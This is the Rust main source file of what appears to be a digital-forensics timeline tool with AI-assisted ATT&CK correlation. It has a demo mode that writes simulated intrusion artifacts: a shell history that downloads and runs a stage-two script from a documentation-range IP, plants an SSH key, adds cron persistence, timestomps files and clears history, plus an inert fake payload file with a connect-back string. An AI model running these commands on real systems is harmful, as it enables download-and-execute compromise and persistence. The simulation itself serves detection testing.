mod ai;
mod analysis;
mod collectors;
mod defense;
mod models;
mod ui;

use ai::GeminiClient;
use analysis::Correlator;
use clap::Parser;
use collectors::CollectorManager;
use crossterm::{
    event::{self, Event, KeyCode, KeyEventKind, KeyModifiers},
    execute,
    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
};
use ratatui::{backend::CrosstermBackend, Terminal};
use std::io::{stdout, Write};
use std::path::PathBuf;
use std::time::Duration;
use tokio::sync::mpsc;
use ui::AppState;

#[derive(Parser, Debug)]
#[command(
    name = "chrono-shard",
    author = "CHRONO-SHARD DFIR Team",
    version = "0.1.0",
    about = "Blazing-fast digital forensics time-machine with dual-model Gemini AI MITRE ATT&CK correlation"
)]
struct Cli {
    /// Custom directories or files to sweep
    #[arg(short, long)]
    scan_path: Vec<PathBuf>,

    /// Sliding window duration in seconds for burst detection
    #[arg(short = 'w', long, default_value_t = 15)]
    window: i64,

    /// Event count threshold to trigger an anomalous burst
    #[arg(short = 'b', long, default_value_t = 8)]
    burst_threshold: usize,

    /// Google Gemini API Key (or set GEMINI_API_KEY environment variable)
    #[arg(long)]
    api_key: Option<String>,

    /// Rapid triage model
    #[arg(long, default_value = "gemini-3.5-flash-lite")]
    flash_model: String,

    /// Deep kill-chain synthesis model
    #[arg(long, default_value = "gemini-4-carbon")]
    carbon_model: String,

    /// Generate simulated demo attack artifacts to test DFIR timeline
    #[arg(long)]
    simulate: bool,

    /// Export incident report directly to path without starting TUI
    #[arg(long)]
    export: Option<String>,

    /// Run AI analysis in headless mode and output report to stdout
    #[arg(long)]
    headless_ai: bool,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Cli::parse();

    // 1. Privilege check & diagnostic notice
    check_privileges();

    // 2. Generate simulation artifacts if requested or if no standard artifacts found
    if args.simulate {
        generate_demo_attack_artifacts()?;
    }

    // 3. Sweep all forensic telemetry in parallel
    println!("[*] Sweeping live filesystem metadata, logs, shell histories, and browser artifacts...");
    let collector_manager = CollectorManager::new(args.scan_path.clone());
    let (raw_events, sweep_duration) = collector_manager.sweep_all();
    println!(
        "[+] Swept {} raw forensic events in {:.3} seconds.",
        raw_events.len(),
        sweep_duration
    );

    // 4. Chronological merge-sort, deduplication & sliding-window burst detection
    let correlator = Correlator::new(args.window, args.burst_threshold);
    let (correlated_events, bursts) = correlator.process(raw_events);
    println!(
        "[+] Correlated {} timeline events. Detected {} anomalous temporal bursts.",
        correlated_events.len(),
        bursts.len()
    );

    // 5. Initialize Gemini AI Client
    let gemini_client = GeminiClient::new(
        args.api_key.clone(),
        Some(args.flash_model.clone()),
        Some(args.carbon_model.clone()),
    );

    let ai_model_label = if gemini_client.has_api_key() {
        format!("{}+{}", args.flash_model, args.carbon_model)
    } else {
        "Gemini Dual-Model (Demo / Offline Mode)".to_string()
    };

    // 6. Handle Headless Export / CLI modes
    if let Some(export_path) = args.export {
        return run_headless_export(
            correlated_events,
            bursts,
            sweep_duration,
            &gemini_client,
            &export_path,
        )
        .await;
    }

    if args.headless_ai {
        return run_headless_ai(correlated_events, bursts, &gemini_client).await;
    }

    // 7. Bootstrap 60fps TUI
    run_tui(
        correlated_events,
        bursts,
        sweep_duration,
        gemini_client,
        ai_model_label,
    )
    .await
}

fn check_privileges() {
    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if !is_root {
            eprintln!("[!] NOTICE: Running without root privileges. Standard user artifacts will be collected.");
            eprintln!("    To inspect /var/log/auth.log, auditd, and root crontabs, re-run with `sudo`.");
        }
    }
    #[cfg(windows)]
    {
        // Informational Windows diagnostic
        eprintln!("[*] CHRONO-SHARD Windows DFIR Agent active.");
    }
}

async fn run_tui(
    events: Vec<models::ForensicEvent>,
    bursts: Vec<models::TemporalBurst>,
    sweep_duration: f64,
    gemini_client: GeminiClient,
    ai_model_label: String,
) -> anyhow::Result<()> {
    enable_raw_mode()?;
    let mut stdout = stdout();
    execute!(stdout, EnterAlternateScreen)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let mut state = AppState::new(events, bursts, sweep_duration, ai_model_label);

    // Channel for asynchronous streaming AI tokens
    let (stream_tx, mut stream_rx) = mpsc::unbounded_channel::<String>();
    let (report_tx, mut report_rx) = mpsc::unbounded_channel::<models::AiAnalysisReport>();
    let (trap_tx, mut trap_rx) = mpsc::unbounded_channel::<defense::TrapTriggered>();

    let mut last_tick = std::time::Instant::now();
    let tick_rate = Duration::from_millis(16); // ~60 FPS

    loop {
        // Poll for incoming AI stream tokens without blocking UI
        while let Ok(token) = stream_rx.try_recv() {
            state.ai_streaming_buffer.push_str(&token);
        }

        // Poll for finished AI report
        if let Ok(report) = report_rx.try_recv() {
            state.ai_report = Some(report);
            state.is_ai_running = false;
            state.set_notification("AI Incident Reconstruction Completed!".to_string());
        }

        // Poll for Shadow Trap triggered alerts
        if let Ok(trap_event) = trap_rx.try_recv() {
            state.handle_trap_triggered(trap_event);
        }

        // Render current frame
        terminal.draw(|f| ui::render_ui(f, &mut state))?;

        // Handle user input
        let timeout = tick_rate.saturating_sub(last_tick.elapsed());
        if event::poll(timeout)? {
            if let Event::Key(key) = event::read()? {
                // Ignore key release events on Windows/crossterm to avoid duplicate movement
                if key.kind == KeyEventKind::Release {
                    continue;
                }

                if state.trap_freeze_modal_open {
                    match key.code {
                        KeyCode::Char('c') | KeyCode::Char('C') => {
                            state.resume_trap_process();
                            state.trap_freeze_modal_open = false;
                        }
                        KeyCode::Char('k') | KeyCode::Char('K') => {
                            state.kill_trap_process();
                            state.trap_freeze_modal_open = false;
                        }
                        KeyCode::Esc => {
                            state.trap_freeze_modal_open = false;
                        }
                        _ => {}
                    }
                } else if state.filter_modal_open {
                    handle_filter_modal_key(&mut state, key.code);
                } else if state.help_modal_open {
                    if key.code == KeyCode::Esc || key.code == KeyCode::Char('?') || key.code == KeyCode::Char('q') {
                        state.help_modal_open = false;
                    }
                } else {
                    match (key.code, key.modifiers) {
                        (KeyCode::Char('q'), _) | (KeyCode::Char('c'), KeyModifiers::CONTROL) => {
                            state.should_quit = true;
                        }
                        (KeyCode::Tab, _) => state.toggle_pane(),
                        (KeyCode::Down, _) | (KeyCode::Char('j'), KeyModifiers::NONE) => {
                            state.scroll_down();
                        }
                        (KeyCode::Up, _) | (KeyCode::Char('k'), KeyModifiers::NONE) => {
                            state.scroll_up();
                        }
                        (KeyCode::Char('g'), KeyModifiers::NONE) => state.first_event(),
                        (KeyCode::Char('G'), _) => state.last_event(),
                        (KeyCode::Char('b'), _) => state.jump_next_burst(),
                        (KeyCode::Char('f'), _) => {
                            state.filter_modal_open = true;
                        }
                        (KeyCode::Char('c'), KeyModifiers::NONE) => state.clear_filter(),
                        (KeyCode::Char('t'), _) | (KeyCode::Char('T'), _) => {
                            state.arm_shadow_trap(trap_tx.clone());
                        }
                        (KeyCode::Char('r'), _) | (KeyCode::Char('R'), _) => {
                            if let defense::ShadowTrapState::Triggered { .. } = state.shadow_trap.state {
                                state.trap_freeze_modal_open = true;
                            } else {
                                state.set_notification("Shadow Trap not triggered. Press [T] to deploy & arm.".to_string());
                            }
                        }
                        (KeyCode::Char('e'), _) => {
                            let _ = state.export_report();
                        }
                        (KeyCode::Char('?'), _) => {
                            state.help_modal_open = true;
                        }
                        (KeyCode::Char('a'), _) => {
                            if !state.is_ai_running {
                                state.is_ai_running = true;
                                state.ai_streaming_buffer.clear();
                                state.set_notification("Triggering Gemini Dual-Model Pipeline...".to_string());

                                let client_clone = gemini_client.clone();
                                let events_clone = state.all_events.clone();
                                let bursts_clone = state.bursts.clone();
                                let tx_clone = stream_tx.clone();
                                let r_tx = report_tx.clone();

                                tokio::spawn(async move {
                                    // Step 1: Rapid Triage
                                    if let Ok(triage) = client_clone.run_rapid_triage(&events_clone, &bursts_clone).await {
                                        let _ = tx_clone.send(format!("{}\n\n", triage));
                                    }

                                    // Step 2: Deep Kill-Chain Synthesis
                                    if let Ok(report) = client_clone
                                        .stream_killchain_synthesis(&events_clone, &bursts_clone, tx_clone)
                                        .await
                                    {
                                        let _ = r_tx.send(report);
                                    }
                                });
                            }
                        }
                        _ => {}
                    }
                }
            }
        }

        if last_tick.elapsed() >= tick_rate {
            last_tick = std::time::Instant::now();
        }

        if state.should_quit {
            break;
        }
    }

    // Terminal cleanup
    disable_raw_mode()?;
    execute!(terminal.backend_mut(), LeaveAlternateScreen)?;
    terminal.show_cursor()?;
    Ok(())
}

fn handle_filter_modal_key(state: &mut AppState, code: KeyCode) {
    match code {
        KeyCode::Enter => state.apply_filter(),
        KeyCode::Esc => state.filter_modal_open = false,
        KeyCode::Backspace => {
            state.filter_query.pop();
        }
        KeyCode::Char(c) => {
            state.filter_query.push(c);
        }
        _ => {}
    }
}

async fn run_headless_export(
    events: Vec<models::ForensicEvent>,
    bursts: Vec<models::TemporalBurst>,
    duration: f64,
    gemini_client: &GeminiClient,
    export_path: &str,
) -> anyhow::Result<()> {
    println!("[*] Running headless report generation...");
    let mut state = AppState::new(events, bursts, duration, "Gemini Dual-Model".to_string());

    println!("[*] Invoking Gemini Dual-Model Synthesis for export...");
    let (tx, _) = mpsc::unbounded_channel();
    if let Ok(report) = gemini_client
        .stream_killchain_synthesis(&state.all_events, &state.bursts, tx)
        .await
    {
        state.ai_report = Some(report);
    }

    let file_path = state.export_report()?;
    println!("[+] Report successfully exported to: {}", file_path);
    if file_path != export_path {
        std::fs::copy(&file_path, export_path)?;
        println!("[+] Copied to requested destination: {}", export_path);
    }
    Ok(())
}

async fn run_headless_ai(
    events: Vec<models::ForensicEvent>,
    bursts: Vec<models::TemporalBurst>,
    gemini_client: &GeminiClient,
) -> anyhow::Result<()> {
    println!("\n=== CHRONO-SHARD HEADLESS INVESTIGATION REPORT ===");
    println!("[*] Step 1: Rapid Triage (gemini-3.5-flash-lite)...");
    let triage = gemini_client.run_rapid_triage(&events, &bursts).await?;
    println!("{}\n", triage);

    println!("[*] Step 2: Deep Kill-Chain Synthesis (gemini-4-carbon)...");
    let (tx, mut rx) = mpsc::unbounded_channel();
    let client_clone = gemini_client.clone();
    let events_c = events.clone();
    let bursts_c = bursts.clone();

    tokio::spawn(async move {
        let _ = client_clone
            .stream_killchain_synthesis(&events_c, &bursts_c, tx)
            .await;
    });

    while let Some(chunk) = rx.recv().await {
        print!("{}", chunk);
        let _ = stdout().flush();
    }
    println!("\n=== END OF REPORT ===");
    Ok(())
}

fn generate_demo_attack_artifacts() -> anyhow::Result<()> {
    println!("[*] Generating safe simulation attack artifacts in ./test_artifacts...");
    std::fs::create_dir_all("./test_artifacts/persistence")?;
    std::fs::create_dir_all("./test_artifacts/demo_env")?;
    std::fs::create_dir_all("./logs")?;

    // 1. Simulated Auth Log
    let auth_log_content = r#"Nov 21 12:00:01 web-srv sshd[12041]: Failed password for invalid user admin from 198.51.100.24 port 44322 ssh2
Nov 21 12:00:03 web-srv sshd[12042]: Failed password for invalid user root from 198.51.100.24 port 44324 ssh2
Nov 21 12:00:05 web-srv sshd[12045]: Accepted publickey for webadmin from 198.51.100.24 port 44330 ssh2
Nov 21 12:00:10 web-srv sudo: webadmin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c chmod +x /tmp/.sh_cache_payload
Nov 21 12:00:12 web-srv useradd[12099]: new user: name=sys_daemon
Nov 21 12:00:15 web-srv sudo: webadmin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab /etc/cron.d/sys_update
"#;
    std::fs::write("./test_artifacts/auth.log", auth_log_content)?;
    std::fs::write("./logs/auth.log", auth_log_content)?;

    // 2. Simulated Shell History
    let shell_history_content = r#": 1732186800:0;whoami
: 1732186802:0;uname -a
: 1732186805:0;netstat -tulpn
: 1732186808:0;curl -s http://198.51.100.24/stage2.sh -o /tmp/.sh_cache_payload
: 1732186809:0;touch -r /bin/ls /tmp/.sh_cache_payload
: 1732186811:0;chmod +x /tmp/.sh_cache_payload
: 1732186812:0;/tmp/.sh_cache_payload --daemon
: 1732186814:0;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." >> ~/.ssh/authorized_keys
: 1732186815:0;echo "* * * * * root /tmp/.sh_cache_payload > /dev/null 2>&1" > /etc/cron.d/sys_update
: 1732186818:0;history -c
"#;
    std::fs::write("./test_artifacts/shell_history.txt", shell_history_content)?;

    // 3. Simulated Staging File in test_artifacts (High-Entropy Packed Payload)
    let payload_path = "./test_artifacts/.sh_cache_payload";
    let mut payload_bytes = Vec::new();
    payload_bytes.extend_from_slice(b"UPX!\x01\x02\x03\x04");
    payload_bytes.extend_from_slice(b"/bin/sh\x00");
    payload_bytes.extend_from_slice(b"CONNECT_BACK=198.51.100.24:4444\x00");
    payload_bytes.extend_from_slice(b"EXEC_STAGING_STAGE2\x00");
    payload_bytes.extend_from_slice(b"UPX_COMPRESSED_PAYLOAD\x00");
    // Append pseudo-random high-entropy bytes to simulate UPX/XOR packed payload (H > 7.3)
    let mut lcg_state: u32 = 0x1337BEEF;
    for _ in 0..1024 {
        lcg_state = lcg_state.wrapping_mul(1664525).wrapping_add(1013904223);
        payload_bytes.push((lcg_state >> 16) as u8);
    }
    std::fs::write(payload_path, &payload_bytes)?;

    // 4. Simulated Persistence Crontab
    let cron_path = "./test_artifacts/persistence/sys_update";
    std::fs::write(
        cron_path,
        "# Periodic system sync\n* * * * * root /tmp/.sh_cache_payload >/dev/null 2>&1\n",
    )?;

    println!("[+] Demo artifacts generated successfully.");
    Ok(())
}
